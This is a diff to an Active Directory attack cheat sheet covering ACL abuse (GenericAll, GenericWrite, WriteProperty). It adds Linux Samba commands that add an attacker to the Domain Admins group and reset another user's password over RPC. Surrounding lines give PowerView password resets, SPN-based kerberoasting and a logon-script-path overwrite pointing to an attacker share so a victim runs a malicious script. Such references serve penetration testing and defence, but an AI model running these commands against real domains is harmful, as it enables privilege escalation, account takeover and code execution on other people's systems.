@@ -2089,7 +2089,9 @@ ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtr
 #### GenericAll
 
 * **GenericAll on User** : We can reset user's password without knowing the current password
-* **GenericAll on Group** : Effectively, this allows us to add ourselves (the user spotless) to the Domain Admin group : `net group "domain admins" spotless /add /domain`
+* **GenericAll on Group** : Effectively, this allows us to add ourselves (the user spotless) to the Domain Admin group : 
+	* On Windows : `net group "domain admins" spotless /add /domain`
+	* On Linux using the Samba software suite : `net rpc group ADDMEM "GROUP NAME" UserToAdd -U 'AttackerUser%MyPassword' -W DOMAIN -I [DC IP]`
 
 * **GenericAll/GenericWrite** : We can set a **SPN** on a target account, request a TGS, then grab its hash and kerberoast it.
   ```powershell
@@ -2132,15 +2134,20 @@ ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtr
 #### GenericWrite
 
 * Reset another user's password
-
-    ```powershell
-    # https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1
-    $user = 'DOMAIN\user1'; 
-    $pass= ConvertTo-SecureString 'user1pwd' -AsPlainText -Force; 
-    $creds = New-Object System.Management.Automation.PSCredential $user, $pass;
-    $newpass = ConvertTo-SecureString 'newsecretpass' -AsPlainText -Force; 
-    Set-DomainUserPassword -Identity 'DOMAIN\user2' -AccountPassword $newpass -Credential $creds;
-    ```
+	* On Windows:
+		```powershell
+		# https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1
+		$user = 'DOMAIN\user1'; 
+		$pass= ConvertTo-SecureString 'user1pwd' -AsPlainText -Force; 
+		$creds = New-Object System.Management.Automation.PSCredential $user, $pass;
+		$newpass = ConvertTo-SecureString 'newsecretpass' -AsPlainText -Force; 
+		Set-DomainUserPassword -Identity 'DOMAIN\user2' -AccountPassword $newpass -Credential $creds;
+		```
+	* On Linux:
+		```bash
+		# Using rpcclient from the  Samba software suite
+		rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd" 
+		```
 
 * WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : `Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1`
 
